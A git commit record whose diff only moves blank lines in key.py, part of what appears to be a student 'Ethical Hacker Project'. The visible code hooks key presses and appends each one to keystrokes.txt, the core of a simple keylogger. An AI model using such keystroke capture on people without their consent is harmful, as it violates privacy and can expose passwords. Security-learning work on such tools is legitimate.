5423134a5ae171fecdda340337850b8b3b5041f7
raphael <raphaelninja22@gmail.com>
2024-03-14 21:09:11 +0000

    changes

--- 1- cyber_projects/1.Ethical Hacker Project/key.py
+++ 1- cyber_projects/1.Ethical Hacker Project/key.py
@@ -2,9 +2,8 @@ import keyboard
 
 log_file = "keystrokes.txt"  # saved file.
 
+
 # write the keystrokes on file, and format one stroke per like
-
-
 def on_key_press(event):
     with open(log_file, "a") as f:
         f.write("{}\n".format(event.name))
